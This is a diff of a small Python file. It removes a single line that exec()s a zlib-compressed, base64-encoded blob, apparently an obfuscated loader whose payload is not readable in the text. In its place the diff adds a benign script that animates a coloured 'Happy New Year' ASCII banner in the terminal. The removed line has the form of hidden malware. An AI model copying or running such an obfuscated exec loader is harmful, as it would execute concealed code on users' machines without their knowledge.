@@ -1,3 +1,61 @@
-import zlib
-import base64
-exec(zlib.decompress(base64.b64decode('eJyNVs1u20YQvu9TTJkDqcYVlCgqEAE+OK6BGEUCo03aGI6xoMV1Qph/XVKxCMNADjm4lyKUqgYIYPTd8gR9hOwPdzkkpTr0AuJ+M/N9M0MuPSSMs5QXUIQxI/V9mpu7vMwJCdg5zCLmc5rPOGOJN5gSevHTswv27jcGuxD58Vngw2IKC7gP4wkBcaX5UAQXLPZcFetCeC7BxI9FzC64WZqHCxdYlDMQLrk7IOQe7P26f3gIvpA+Tzk4T/eOjo7h+cHvcHyw94tD3vpZVgpJx3EIfPnnRq2qvgPx+0Ev0JfxWJmbm82g3WAzQS6VhZdq3aD1QSshX+y8BV42KdcYQcTv1arjWs7vjeTG5FZdSWyAhsg6EMW/0lhlrZWtDa3atkS2FvMWA+g8PqJUkKwKs3Kruqx2QzG3pgPcFgxC51EpMZOFCaqalI3QErVab6u2UBfsPswlIBnsqSWWrRS0DQw72q7wI1A0BOWB5S11ZaJ7myUqHBARWMHOrnVZOZCx33K1IuQJJQm7pKU4/PWJbQ7N+lNz0taf2ufpposrZ9i6uZMGvgHSKOkClty8ouu/v6w/onVrHXBaerP+3NOT4bd3URm824YuThpDT6dqVdItBrre0E4YJbupeZu6t1HUkJDGAzVle29v+41vR0AnYZ0q/B9Rp3s90V5Xq35DNhWoE8Oe9nk0iUH37dhK1Pj0MsUYkYqmwvrWvEatbYNjP+x0a89vQwnbSDbIbsT0+Z+lUcpzcfqv1BfE5Sxwp+C+Ho3HJ48fxO6Oht/IqaIxPLSGkkVRetlYxtZyFs1Zgz+yeDbnWYQsE2uZlT7S+NHinOWssIZR7JJrPfJkPEwKqkpggVewRbEDaifGHxmp7N65c6WrPFE/p9dX0vPagDX96bWzAywJdl055kh2Pwljv2BUens1o4qhUZgXcqoSP55mGV6wMvcGg5PpDw9OAe7BwWIWzQNmklfBBS+n9jt9+TaMGLzgczZtfbvlUKU4IUyQ3LT3gW/Pe4TyJy9flQev9kRik9Gjnnu7V2pKM826w9f8i9ixT3tLhOe8ThwxXzri73sYj+Ttkag/h/2CR/f3oUiBLcLC6cfL2XaYR4xl3mg4EdX4z+gfL4LgpajmZDJRXaGyI9xP3jDv4eBUUbDFjGUF/MzKs9TnwWFSMM7nGepWp0udfJ+qYfU5u4Rj4fYd/PfvX3+K7O4cneUlZuehrMYbifdFTM6UysGZUjk6O5TGfphQ6uhM2q/SV4bnoL8=')).decode())
+
+import time
+import os
+import sys
+
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+# ASCII art for "HAPPY NEW YEAR"
+happy = """
+ ██░ ██  ▄▄▄       ██▓███   ██▓███ ▓██   ██▓
+▓██░ ██▒▒████▄    ▓██░  ██▒▓██░  ██▒▒██  ██▒
+▒██▀▀██░▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒ ▒██ ██░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒ ░ ▐██▓░
+░▓█▒░██▓ ▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░ ░ ██▒▓░
+ ▒ ░░▒░▒ ▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░  ██▒▒▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░░▒ ░     ░▒ ░     ▓██ ░▒░ 
+ ░  ░░ ░  ░   ▒   ░░       ░░       ▒ ▒ ░░  
+ ░  ░  ░      ░  ░                   ░ ░     
+                                     ░ ░     
+"""
+
+new_year = """
+███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗███████╗ █████╗ ██████╗ 
+████╗  ██║██╔════╝██║    ██║    ╚██╗ ██╔╝██╔════╝██╔══██╗██╔══██╗
+██╔██╗ ██║█████╗  ██║ █╗ ██║     ╚████╔╝ █████╗  ███████║██████╔╝
+██║╚██╗██║██╔══╝  ██║███╗██║      ╚██╔╝  ██╔══╝  ██╔══██║██╔══██╗
+██║ ╚████║███████╗╚███╔███╔╝       ██║   ███████╗██║  ██║██║  ██║
+╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
+"""
+
+colors = {
+    'red': '\033[91m',
+    'green': '\033[92m',
+    'yellow': '\033[93m',
+    'blue': '\033[94m',
+    'purple': '\033[95m',
+    'cyan': '\033[96m',
+    'reset': '\033[0m'
+}
+
+def print_colored(text, color):
+    print(f"{colors[color]}{text}{colors['reset']}", end='')
+
+def animate_text():
+    color_list = list(colors.keys())[:-1]  # Exclude 'reset'
+    try:
+        while True:
+            for color in color_list:
+                clear_screen()
+                print_colored(happy, color)
+                print_colored(new_year, 'yellow')
+                print("\n" + " " * 30 + "Press Ctrl+C to exit")
+                time.sleep(0.5)
+    except KeyboardInterrupt:
+        clear_screen()
+        print("Happy New Year! 🎉")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    animate_text()
